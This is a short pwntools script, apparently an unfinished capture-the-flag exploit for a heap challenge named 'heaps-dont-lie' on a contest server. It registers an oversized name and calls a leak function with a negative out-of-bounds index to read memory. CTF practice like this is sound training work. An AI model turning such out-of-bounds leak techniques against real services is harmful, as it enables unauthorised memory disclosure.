#!/usr/bin/env python3

from pwn import *

exe = ELF("./heaps-dont-lie_patched")

context.binary = exe

def conn():
    r = process([exe.path])
    return r

r = remote("server.challenge.ctf.thefewchosen.com", 1341)
#r = conn()

def register(name):
    r.recv()
    r.sendline("1")
    r.recvline()
    r.sendline(name)

def get_flag():
    r.recv()
    r.sendline("4")

def leak(index):
    r.recv()
    r.sendline("3")
    r.recvline()
    r.sendline(str(index))

def main():
    
    i = 1
    
    #r.interactive()
    register("A"*0x400)
    get_flag()
    pause()
    leak(-2416) # -2316
    """
    for _ in range(21 - 3):
        register(chr(ord("A") + i)*(0x10 * i))
        i += 1
    """

    

    r.interactive()


if __name__ == "__main__":
    main()
